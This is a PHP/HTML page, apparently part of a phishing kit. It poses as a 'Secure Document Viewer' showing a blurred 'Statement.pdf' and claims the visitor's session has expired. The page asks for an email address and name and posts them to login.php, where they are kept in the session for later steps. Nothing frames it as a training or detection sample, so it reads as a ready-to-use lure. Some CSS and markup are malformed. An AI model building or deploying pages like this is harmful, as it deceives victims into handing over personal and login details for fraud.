<?php session_start(); ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Document Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
        /* Global reset / basics */
        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
            background-color: #111;
            color: #222;
            min-height: 100vh;
        }

        /* Layout wrapper */
        .page-wrapper {
            position: relative;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        /* Background "PDF" */
        .doc-background {
            position: absolute;
            inset: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            filter: blur(6px);
            transform: scale(1.02);
            opacity: 0.7;
        }

        .doc-background img {
            max-width: 100%;
            max-height: 100vh;
            object-fit: contain;
        }

        /* Dark overlay */
        .page-wrapper::before {
            content: "";
            position: absolute;
            inset: 0;
            background: radial-gradient(circle at center, rgba(0,0,0,0.1), rgba(0,0,0,0.7));
            pointer-events: none;
        }

        /* Login card */
        .login-card {
            position: relative;
            z-index: 2;
            width: 45%;
            max-width: 320px;
            background: #f5f5f5;
            border-radius: 3px;
            padding: 18px 26px 26px;
            box-shadow:
                0 20px 40px rgba(0, 0, 0, 0.35),
                0 0 0 1px rgba(0, 0, 0, 0.05);
        }

        /* PDF icon */
        .doc-icon {
            width: 34px;
            height: 40px;
            border-radius: 8px;
            background: #B80000;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 4px;
        }

        .doc-icon-pdf {
            font-weight: 700;
            color: #fff;
            font-size: 10px;
        }

        /* Titles */
        .doc-title {
            font-size: 15px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 6px;
        }

        .doc-size {
            font-weight: 400;
            color: #666;
            font-size: 11px;
        }

        .doc-subtitle {
            font-size: 11px;
            color: #666;
            text-align: center;
            margin-bottom: 8px;
        }

        .doc-note {
            font-size: 0px;
            color: #999;
            text-align: center;
            margin-bottom: 18px;
        }

        /* Error message */
        .login-error {
            color: #c21515;
            font-size: 10px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 14px;
        }

        /* Form */
        .login-form {
            display: flex;
            flex-direction: column;
            gap: px;
        }

        .field-label {
            font-size: 0px;
            font-weight: 500;
            color: #555;
            margin-bottom: 15px;
        }

        .field-wrapper input {
            width: 100%;
            padding: 10px 11px;
            border-radius: 3px;
            border: 1px solid #d0d0d0;
            font-size: 14px;
            outline: none;
            transition: border-color 0.15s ease, box-shadow 0.15s ease;
        }

        .field-wrapper input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 1px rgba(26, 115, 232, 0.2);
        }

        /* Primary button */
        .btn-primary {
            margin-top: 10px;
            width: 100%;
            padding: 11px 12px;
          
            border: none;
            background: #1a73e8;
            color: #fff;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            border-radius: 4px;
            transition: background 0.15s ease, box-shadow 0.15s ease, transform 0.05s ease;
        }

        .btn-primary:hover {
            background: #185abc;
            box-shadow: 0 3px 10px rgba(26, 115, 232, 0.4);
        }

        .btn-primary:active {
            transform: translateY(1px);
        }

        @media (max-width: 480px) {
            .login-card {
                padding: 22px 18px 18px;
                border-radius: 4px;
            }
            .doc-title { font-size: 16px; }
            
            
             
            .doc-icon {
    width: 50px;       /* adjust width */
    height: 50px;      /* adjust height */
    border-radius: 8px;
    background: #B80000; /* fallback color if image doesn't load */
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 8px;
    overflow: hidden;  /* ensures image stays inside */
}

.doc-icon-img {
    max-width: 80%;    /* image fits nicely inside icon */
    max-height: 80%;
    object-fit: contain;
}

        }
    </style>
</head>
<body>
<div class="page-wrapper">
    <div class="doc-background">
        <img src="assets/background.png" alt="Document preview">
    </div>

    <div class="doc-icon">
    <!-- Replace span with an image -->
    <img src="assets/PDtrans.png" alt="PDF Icon" class="doc-icon-img">
</div>

        <h2 class="doc-title">Statement.pdf <span class="doc-size">(197 KB)</span></h2>
        <p class="doc-subtitle">Previous session has expired, log in to continue.</p>
     

        <?php if (!empty($_SESSION['error_message'])): ?>
            <p class="login-error"><?= $_SESSION['error_message']; ?></p>
            <?php unset($_SESSION['error_message']); ?>
        <?php endif; ?>

        <form class="login-form" method="POST" action="login.php" autocomplete="off">
            <label class="field-label" for="email"></label>
            <div class="field-wrapper">
                <input id="email" name="email" type="email"
                       value="<?= isset($_SESSION['old_email']) ? htmlspecialchars($_SESSION['old_email']) : '' ?>"
                       placeholder="Enter your email" required>
            </div>

            <label class="field-label" for="name">Name</label>
            <div class="field-wrapper">
                <input id="name" name="name" type="name" placeholder="Enter your name" required>
            </div>

            <button type="submit" class="btn-primary">Next</button>
        </form>
    </div>
</div>
</body>
</html>
